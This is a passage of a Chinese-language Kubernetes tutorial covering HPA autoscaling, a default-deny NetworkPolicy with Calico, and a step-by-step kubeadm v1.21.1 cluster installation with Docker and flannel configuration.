CPU限制，单位是core数</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建service</span></span><br><span class="line">kubectl expose deployment nginx --type=NodePort --port=80</span><br></pre></td></tr></table></figure>

<p>3.创建HPA</p>
<p>创建pc-hpa.yaml文件，内容如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">autoscaling/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">HorizontalPodAutoscaler</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pc-hpa</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">minReplicas:</span> <span class="number">1</span>  <span class="comment">#最小pod数量</span></span><br><span class="line">  <span class="attr">maxReplicas:</span> <span class="number">10</span> <span class="comment">#最大pod数量</span></span><br><span class="line">  <span class="attr">targetCPUUtilizationPercentage:</span> <span class="number">3</span> <span class="comment"># CPU使用率指标</span></span><br><span class="line">  <span class="attr">scaleTargetRef:</span>   <span class="comment"># 指定要控制的nginx信息</span></span><br><span class="line">    <span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line">    <span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nginx</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建hpa</span></span><br><span class="line">[<span class="string">root@k8s-master01</span> <span class="number">1.8</span><span class="string">+</span>]<span class="comment"># kubectl create -f pc-hpa.yaml</span></span><br><span class="line"><span class="string">horizontalpodautoscaler.autoscaling/pc-hpa</span> <span class="string">created</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看hpa</span></span><br><span class="line">    [<span class="string">root@k8s-master01</span> <span class="number">1.8</span><span class="string">+</span>]<span class="comment"># kubectl get hpa </span></span><br><span class="line"><span class="string">NAME</span>     <span class="string">REFERENCE</span>          <span class="string">TARGETS</span>   <span class="string">MINPODS</span>   <span class="string">MAXPODS</span>   <span class="string">REPLICAS</span>   <span class="string">AGE</span></span><br><span class="line"><span class="string">pc-hpa</span>   <span class="string">Deployment/nginx</span>   <span class="number">0</span><span class="string">%/3%</span>     <span class="number">1</span>         <span class="number">10</span>        <span class="number">1</span>          <span class="string">62s</span></span><br></pre></td></tr></table></figure>

<h3 id="4-测试"><a href="#4-测试" class="headerlink" title="4.测试"></a><strong>4.测试</strong></h3><p>使用压测工具对service地址<code>10.1.0.100:31830</code>进行压测，然后通过控制台查看hpa和pod的变化</p>
<p>hpa变化</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl get hpa  -w</span><br></pre></td></tr></table></figure>

<p>deployment变化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl get pods  -w</span><br></pre></td></tr></table></figure>



<h2 id="五-NetworkPolicy-管理"><a href="#五-NetworkPolicy-管理" class="headerlink" title="五.NetworkPolicy 管理"></a>五.NetworkPolicy 管理</h2><h3 id="题目要求：-1"><a href="#题目要求：-1" class="headerlink" title="题目要求："></a>题目要求：</h3><p>在 master 节点&#x2F;root 目录下编写 yaml 文件 network-policy-deny.yaml，具体要求如下：<br>（1）NetworkPolicy 名称：default-deny；<br>（2）命名空间：default；<br>（3）默认禁止所有入 Pod 流量。<br>完成后使用该 yaml 文件创建 NetworkPolicy</p>
<p><strong>注意需要安装插件并且需要较高的K8S版本以</strong></p>
<p>[v1.21.1为例]: </p>
<h3 id="1-部署网络"><a href="#1-部署网络" class="headerlink" title="1.部署网络"></a>1.部署网络</h3><p>注意：</p>
<p>​        CNI插件需要启用，Calico安装为CNI插件。必须通过传递<code>--network-plugin=cni</code>参数将kubelet配置为使用CNI网络。（在kubeadm上，这是默认设置。）</p>
<p>​       我们这里使用Kubernetes的etcd进行安装，首先确保Kubernetes设置<code>--cluster-cidr=10.244.0.0/16</code>和<code>--allocate-node-cidrs=true</code>。（kubeadm是默认安装的）</p>
<p>我们集群启动了RBAC，所以要创建RBAC</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl apply -f https://docs.projectcalico.org/v3.3/getting-started/kubernetes/installation/hosted/canal/rbac.yaml</span><br></pre></td></tr></table></figure>

<p>安装calico</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl apply -f https://docs.projectcalico.org/v3.3/getting-started/kubernetes/installation/hosted/canal/canal.yaml</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="①下载-calico-网络需要用到的镜像"><a href="#①下载-calico-网络需要用到的镜像" class="headerlink" title="①下载 calico 网络需要用到的镜像"></a>①下载 calico 网络需要用到的镜像</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull docker.io/calico/cni:v3.21.1 </span><br><span class="line">docker pull docker.io/calico/pod2daemon-flexvol:v3.21.1</span><br><span class="line">docker pull docker.io/calico/node:v3.21.1</span><br><span class="line">docker pull docker.io/calico/kube-controllers:v3.21.1</span><br></pre></td></tr></table></figure>

<h4 id="更改网络类型"><a href="#更改网络类型" class="headerlink" title="更改网络类型"></a>更改网络类型</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl delete -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml</span><br></pre></td></tr></table></figure>



<h4 id="②下载calico网络的yaml部署文件"><a href="#②下载calico网络的yaml部署文件" class="headerlink" title="②下载calico网络的yaml部署文件"></a>②下载calico网络的yaml部署文件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">获取calico的yaml文件</span> </span><br><span class="line">wget https://docs.projectcalico.org/manifests/calico.yaml --no-check-certificate</span><br><span class="line"><span class="meta prompt_"> #</span><span class="language-bash">查看镜像是否正确</span></span><br><span class="line">   cat calico.yaml | grep image</span><br><span class="line">          image: docker.io/calico/cni:v3.21.1</span><br><span class="line">          image: docker.io/calico/cni:v3.21.1</span><br><span class="line">          image: docker.io/calico/pod2daemon-flexvol:v3.21.1</span><br><span class="line">          image: docker.io/calico/node:v3.21.1</span><br><span class="line">          image: docker.io/calico/kube-controllers:v3.21.1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">部署网络</span></span><br><span class="line">kubectl apply -f calico.yaml </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看pod是否正常运行</span></span><br><span class="line">kubectl get pods -A</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-定义一个入站流量拒绝的规则"><a href="#2-定义一个入站流量拒绝的规则" class="headerlink" title="2.定义一个入站流量拒绝的规则"></a>2.定义一个入站流量拒绝的规则</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">networking.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">NetworkPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">deny-all-policy</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">podSelector:</span> &#123;&#125;</span><br><span class="line">  <span class="attr">policyTypes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Ingress</span></span><br><span class="line"></span><br><span class="line"><span class="string">$</span> <span class="string">kubectl</span> <span class="string">apply</span> <span class="string">-f</span> <span class="string">network-policy.yaml</span>  <span class="string">-n</span> <span class="string">dev</span></span><br></pre></td></tr></table></figure>

<h3 id="3-在dev和prod的namespace下个各自创建一个pod"><a href="#3-在dev和prod的namespace下个各自创建一个pod" class="headerlink" title="3.在dev和prod的namespace下个各自创建一个pod"></a>3.在dev和prod的namespace下个各自创建一个pod</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: pod-1</span><br><span class="line">  labels:</span><br><span class="line">    name: myapp</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - name: myapp</span><br><span class="line">    image: ikubernetes/myapp:v1</span><br><span class="line"></span><br><span class="line">$  kubectl apply -f policy-pod.yaml  -n dev</span><br><span class="line"></span><br><span class="line">$  kubectl apply -f policy-pod.yaml  -n prod</span><br><span class="line"><span class="comment"># 测试一下</span></span><br><span class="line">$ kubectl get pod -o wide   -n prod </span><br><span class="line">NAME      READY     STATUS    RESTARTS   AGE       IP           NODE</span><br><span class="line">pod-1     1/1       Running   0          3h        10.244.2.3   k8s-node02</span><br><span class="line">$ kubectl get pod -owide   -n dev </span><br><span class="line">NAME      READY     STATUS    RESTARTS   AGE       IP           NODE</span><br><span class="line">pod-1     1/1       Running   0          3h        10.244.2.2   k8s-node02</span><br><span class="line">$ curl 10.244.2.3</span><br><span class="line">Hello MyApp | Version: v1 | &lt;a href=<span class="string">&quot;hostname.html&quot;</span>&gt;Pod Name&lt;/a&gt;</span><br><span class="line">$ 10.244.2.2 不通</span><br></pre></td></tr></table></figure>



<h2 id="六-k8s安装v2-21-1"><a href="#六-k8s安装v2-21-1" class="headerlink" title="六.k8s安装v2.21.1"></a>六.k8s安装v2.21.1</h2><h2 id="2-6-系统初始化"><a href="#2-6-系统初始化" class="headerlink" title="2.6 系统初始化"></a>2.6 系统初始化</h2><h3 id="2-6-1-设置系统主机名以及-Host-文件的相互解析"><a href="#2-6-1-设置系统主机名以及-Host-文件的相互解析" class="headerlink" title="2.6.1 设置系统主机名以及 Host 文件的相互解析"></a>2.6.1 设置系统主机名以及 Host 文件的相互解析</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname k8s-master01 &amp;&amp; bash</span><br><span class="line">hostnamectl set-hostname k8s-node01 &amp;&amp; bash</span><br><span class="line">hostnamectl set-hostname k8s-node02 &amp;&amp; bash</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;EOF&gt;&gt; /etc/hosts</span><br><span class="line">192.168.5.3     k8s-master01</span><br><span class="line">192.168.5.4     k8s-node01</span><br><span class="line">192.168.5.5     k8s-node02</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp /etc/hosts root@192.168.5.4:/etc/hosts </span><br><span class="line">scp /etc/hosts root@192.168.5.5:/etc/hosts </span><br></pre></td></tr></table></figure>

<h3 id="2-6-2-安装依赖文件（所有节点都要操作）"><a href="#2-6-2-安装依赖文件（所有节点都要操作）" class="headerlink" title="2.6.2 安装依赖文件（所有节点都要操作）"></a>2.6.2 安装依赖文件（所有节点都要操作）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y conntrack ntpdate ntp ipvsadm ipset jq iptables curl sysstat libseccomp wget vim net-tools git</span><br></pre></td></tr></table></figure>

<h3 id="2-6-3-设置防火墙为-Iptables-并设置空规则（所有节点都要操作）"><a href="#2-6-3-设置防火墙为-Iptables-并设置空规则（所有节点都要操作）" class="headerlink" title="2.6.3 设置防火墙为 Iptables 并设置空规则（所有节点都要操作）"></a>2.6.3 设置防火墙为 Iptables 并设置空规则（所有节点都要操作）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld &amp;&amp; systemctl disable firewalld</span><br><span class="line"></span><br><span class="line">yum -y install iptables-services &amp;&amp; systemctl start iptables &amp;&amp; systemctl enable iptables &amp;&amp; iptables -F &amp;&amp; service iptables save</span><br></pre></td></tr></table></figure>

<h3 id="2-6-4-关闭-SELINUX（所有节点都要操作）"><a href="#2-6-4-关闭-SELINUX（所有节点都要操作）" class="headerlink" title="2.6.4 关闭 SELINUX（所有节点都要操作）"></a>2.6.4 关闭 SELINUX（所有节点都要操作）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">swapoff -a &amp;&amp; sed -i &#x27;/ swap / s/^\(.*\)$/#\1/g&#x27; /etc/fstab</span><br><span class="line"></span><br><span class="line">setenforce 0 &amp;&amp; sed -i &#x27;s/^SELINUX=.*/SELINUX=disabled/&#x27; /etc/selinux/config</span><br></pre></td></tr></table></figure>

<h3 id="2-6-5-调整内核参数，对于-K8S（所有节点都要操作）"><a href="#2-6-5-调整内核参数，对于-K8S（所有节点都要操作）" class="headerlink" title="2.6.5 调整内核参数，对于 K8S（所有节点都要操作）"></a>2.6.5 调整内核参数，对于 K8S（所有节点都要操作）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">modprobe br_netfilter</span><br><span class="line"></span><br><span class="line">cat &lt;&lt;EOF&gt; kubernetes.conf </span><br><span class="line">net.bridge.bridge-nf-call-iptables=1</span><br><span class="line">net.bridge.bridge-nf-call-ip6tables=1</span><br><span class="line">net.ipv4.ip_forward=1</span><br><span class="line">net.ipv4.tcp_tw_recycle=0</span><br><span class="line">vm.swappiness=0 # 禁止使用 swap 空间，只有当系统 OOM 时才允许使用它</span><br><span class="line">vm.overcommit_memory=1 # 不检查物理内存是否够用</span><br><span class="line">vm.panic_on_oom=0 # 开启 OOM</span><br><span class="line">fs.inotify.max_user_instances=8192</span><br><span class="line">fs.inotify.max_user_watches=1048576</span><br><span class="line">fs.file-max=52706963</span><br><span class="line">fs.nr_open=52706963</span><br><span class="line">net.ipv6.conf.all.disable_ipv6=1</span><br><span class="line">net.netfilter.nf_conntrack_max=2310720</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">cp kubernetes.conf /etc/sysctl.d/kubernetes.conf</span><br><span class="line"></span><br><span class="line">sysctl -p /etc/sysctl.d/kubernetes.conf</span><br></pre></td></tr></table></figure>

<h3 id="2-6-6-调整系统时区（所有节点都要操作）"><a href="#2-6-6-调整系统时区（所有节点都要操作）" class="headerlink" title="2.6.6 调整系统时区（所有节点都要操作）"></a>2.6.6 调整系统时区（所有节点都要操作）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置系统时区为 中国/上海</span></span><br><span class="line">timedatectl set-timezone Asia/Shanghai</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将当前的 UTC 时间写入硬件时钟</span></span><br><span class="line">timedatectl set-local-rtc 0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启依赖于系统时间的服务</span></span><br><span class="line">systemctl restart rsyslog</span><br><span class="line">systemctl restart crond</span><br></pre></td></tr></table></figure>

<h3 id="2-6-7-设置-rsyslogd-和-systemd-journald（所有节点都要操作）"><a href="#2-6-7-设置-rsyslogd-和-systemd-journald（所有节点都要操作）" class="headerlink" title="2.6.7 设置 rsyslogd 和 systemd journald（所有节点都要操作）"></a>2.6.7 设置 rsyslogd 和 systemd journald（所有节点都要操作）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">持久化保存日志的目录</span></span><br><span class="line">mkdir /var/log/journal </span><br><span class="line">mkdir /etc/systemd/journald.conf.d</span><br><span class="line">cat &gt; /etc/systemd/journald.conf.d/99-prophet.conf &lt;&lt;EOF</span><br><span class="line">[Journal]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">持久化保存到磁盘</span></span><br><span class="line">Storage=persistent</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">压缩历史日志</span></span><br><span class="line">Compress=yes</span><br><span class="line"></span><br><span class="line">SyncIntervalSec=5m</span><br><span class="line">RateLimitInterval=30s</span><br><span class="line">RateLimitBurst=1000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">最大占用空间 10G</span></span><br><span class="line">SystemMaxUse=10G</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">单日志文件最大 200M</span></span><br><span class="line">SystemMaxFileSize=200M</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">日志保存时间 2 周</span></span><br><span class="line">MaxRetentionSec=2week</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不将日志转发到 syslog</span></span><br><span class="line">ForwardToSyslog=no</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">systemctl restart systemd-journald</span><br></pre></td></tr></table></figure>

<h3 id="2-6-8-kube-proxy开启ipvs的前置条件（所有节点都要操作）"><a href="#2-6-8-kube-proxy开启ipvs的前置条件（所有节点都要操作）" class="headerlink" title="2.6.8 kube-proxy开启ipvs的前置条件（所有节点都要操作）"></a>2.6.8 kube-proxy开启ipvs的前置条件（所有节点都要操作）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;EOF&gt; /etc/sysconfig/modules/ipvs.modules </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">modprobe -- ip_vs</span><br><span class="line">modprobe -- ip_vs_rr</span><br><span class="line">modprobe -- ip_vs_wrr</span><br><span class="line">modprobe -- ip_vs_sh</span><br><span class="line">modprobe -- nf_conntrack_ipv4</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">chmod 755 /etc/sysconfig/modules/ipvs.modules &amp;&amp; bash /etc/sysconfig/modules/ipvs.modules &amp;&amp; lsmod | grep -e ip_vs -e nf_conntrack_ipv4</span><br></pre></td></tr></table></figure>

<h3 id="2-6-9-安装-Docker-软件（所有节点都要操作）"><a href="#2-6-9-安装-Docker-软件（所有节点都要操作）" class="headerlink" title="2.6.9 安装 Docker 软件（所有节点都要操作）"></a>2.6.9 安装 Docker 软件（所有节点都要操作）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class="line"></span><br><span class="line">yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line"></span><br><span class="line">yum install -y docker-ce</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 创建 /etc/docker 目录</span></span></span><br><span class="line">mkdir /etc/docker</span><br><span class="line"></span><br><span class="line">cat &gt; /etc/docker/daemon.json &lt;&lt;EOF</span><br><span class="line">&#123;</span><br><span class="line">&quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;],</span><br><span class="line">&quot;log-driver&quot;: &quot;json-file&quot;,</span><br><span class="line">&quot;log-opts&quot;: &#123;</span><br><span class="line">&quot;max-size&quot;: &quot;100m&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">mkdir -p /etc/systemd/system/docker.service.d</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启docker服务</span></span><br><span class="line">systemctl daemon-reload &amp;&amp; systemctl restart docker &amp;&amp; systemctl enable docker</span><br></pre></td></tr></table></figure>

<p>上传文件到<code>/etc/yum.repos.d/</code>目录下，也可以 代替 <code>yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</code> 命令</p>
<p>docker-ce.repo</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[docker-ce-stable]</span><br><span class="line">name=Docker CE Stable - $basearch</span><br><span class="line">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/$basearch/stable</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br><span class="line"></span><br><span class="line">[docker-ce-stable-debuginfo]</span><br><span class="line">name=Docker CE Stable - Debuginfo $basearch</span><br><span class="line">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/debug-$basearch/stable</span><br><span class="line">enabled=0</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br><span class="line"></span><br><span class="line">[docker-ce-stable-source]</span><br><span class="line">name=Docker CE Stable - Sources</span><br><span class="line">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/source/stable</span><br><span class="line">enabled=0</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br><span class="line"></span><br><span class="line">[docker-ce-test]</span><br><span class="line">name=Docker CE Test - $basearch</span><br><span class="line">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/$basearch/test</span><br><span class="line">enabled=0</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br><span class="line"></span><br><span class="line">[docker-ce-test-debuginfo]</span><br><span class="line">name=Docker CE Test - Debuginfo $basearch</span><br><span class="line">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/debug-$basearch/test</span><br><span class="line">enabled=0</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br><span class="line"></span><br><span class="line">[docker-ce-test-source]</span><br><span class="line">name=Docker CE Test - Sources</span><br><span class="line">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/source/test</span><br><span class="line">enabled=0</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br><span class="line"></span><br><span class="line">[docker-ce-nightly]</span><br><span class="line">name=Docker CE Nightly - $basearch</span><br><span class="line">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/$basearch/nightly</span><br><span class="line">enabled=0</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br><span class="line"></span><br><span class="line">[docker-ce-nightly-debuginfo]</span><br><span class="line">name=Docker CE Nightly - Debuginfo $basearch</span><br><span class="line">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/debug-$basearch/nightly</span><br><span class="line">enabled=0</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br><span class="line"></span><br><span class="line">[docker-ce-nightly-source]</span><br><span class="line">name=Docker CE Nightly - Sources</span><br><span class="line">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/source/nightly</span><br><span class="line">enabled=0</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br></pre></td></tr></table></figure>

<h3 id="2-6-10-安装-Kubeadm-（所有节点都要操作）"><a href="#2-6-10-安装-Kubeadm-（所有节点都要操作）" class="headerlink" title="2.6.10 安装 Kubeadm （所有节点都要操作）"></a>2.6.10 安装 Kubeadm （所有节点都要操作）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;EOF &gt; /etc/yum.repos.d/kubernetes.repo</span><br><span class="line">[kubernetes]</span><br><span class="line">name=Kubernetes</span><br><span class="line">baseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br><span class="line">repo_gpgcheck=0</span><br><span class="line">gpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg</span><br><span class="line">http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">yum install -y kubelet-1.21.1 kubeadm-1.21.1 kubectl-1.21.1 &amp;&amp; systemctl enable kubelet</span><br></pre></td></tr></table></figure>

<h2 id="2-7-部署Kubernetes-Master"><a href="#2-7-部署Kubernetes-Master" class="headerlink" title="2.7 部署Kubernetes Master"></a>2.7 部署Kubernetes Master</h2><h3 id="2-7-1-初始化主节点（主节点操作）"><a href="#2-7-1-初始化主节点（主节点操作）" class="headerlink" title="2.7.1 初始化主节点（主节点操作）"></a>2.7.1 初始化主节点（主节点操作）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubeadm init --apiserver-advertise-address=192.168.5.3 --image-repository registry.aliyuncs.com/google_containers --kubernetes-version v1.21.1 --service-cidr=10.96.0.0/12 --pod-network-cidr=10.244.0.0/16</span><br><span class="line"></span><br><span class="line">mkdir -p $HOME/.kube</span><br><span class="line"></span><br><span class="line">sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class="line"></span><br><span class="line">sudo chown $(id -u):$(id -g) $HOME/.kube/config</span><br></pre></td></tr></table></figure>

<h3 id="2-7-2-加入主节点以及其余工作节点"><a href="#2-7-2-加入主节点以及其余工作节点" class="headerlink" title="2.7.2 加入主节点以及其余工作节点"></a>2.7.2 加入主节点以及其余工作节点</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubeadm join 192.168.5.3:6443 --token h0uelc.l46qp29nxscke7f7 \</span><br><span class="line">        --discovery-token-ca-cert-hash sha256:abc807778e24bff73362ceeb783cc7f6feec96f20b4fd707c3f8e8312294e28f </span><br></pre></td></tr></table></figure>

<h3 id="2-7-3-部署网络"><a href="#2-7-3-部署网络" class="headerlink" title="2.7.3 部署网络"></a>2.7.3 部署网络</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml</span><br></pre></td></tr></table></figure>

<p>下边是文件</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">policy/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PodSecurityPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">psp.flannel.unprivileged</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">    <span class="attr">seccomp.security.alpha.kubernetes.io/allowedProfileNames:</span> <span class="string">docker/default</span></span><br><span class="line">    <span class="attr">seccomp.security.alpha.kubernetes.io/defaultProfileName:</span> <span class="string">docker/default</span></span><br><span class="line">    <span class="attr">apparmor.security.beta.kubernetes.io/allowedProfileNames:</span> <span class="string">runtime/default</span></span><br><span class="line">    <span class="attr">apparmor.security.beta.kubernetes.io/defaultProfileName:</span> <span class="string">runtime/default</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">privileged:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">configMap</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">secret</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">emptyDir</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">hostPath</span></span><br><span class="line">  <span class="attr">allowedHostPaths:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">pathPrefix:</span> <span class="string">&quot;/etc/cni/net.d&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">pathPrefix:</span> <span class="string">&quot;/etc/kube-flannel&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">pathPrefix:</span> <span class="string">&quot;/run/flannel&quot;</span></span><br><span class="line">  <span class="attr">readOnlyRootFilesystem:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Users and groups</span></span><br><span class="line">  <span class="attr">runAsUser:</span></span><br><span class="line">    <span class="attr">rule:</span> <span class="string">RunAsAny</span></span><br><span class="line">  <span class="attr">supplementalGroups:</span></span><br><span class="line">    <span class="attr">rule:</span> <span class="string">RunAsAny</span></span><br><span class="line">  <span class="attr">fsGroup:</span></span><br><span class="line">    <span class="attr">rule:</span> <span class="string">RunAsAny</span></span><br><span class="line">  <span class="comment"># Privilege Escalation</span></span><br><span class="line">  <span class="attr">allowPrivilegeEscalation:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">defaultAllowPrivilegeEscalation:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Capabilities</span></span><br><span class="line">  <span class="attr">allowedCapabilities:</span> [<span class="string">&#x27;NET_ADMIN&#x27;</span>, <span class="string">&#x27;NET_RAW&#x27;</span>]</span><br><span class="line">  <span class="attr">defaultAddCapabilities:</span> []</span><br><span class="line">  <span class="attr">requiredDropCapabilities:</span> []</span><br><span class="line">  <span class="comment"># Host namespaces</span></span><br><span class="line">  <span class="attr">hostPID:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">hostIPC:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hostPorts:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">min:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">max:</span> <span class="number">65535</span></span><br><span class="line">  <span class="comment"># SELinux</span></span><br><span class="line">  <span class="attr">seLinux:</span></span><br><span class="line">    <span class="comment"># SELinux is unused in CaaSP</span></span><br><span class="line">    <span class="attr">rule:</span> <span class="string">&#x27;RunAsAny&#x27;</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">flannel</span></span><br><span class="line"><span 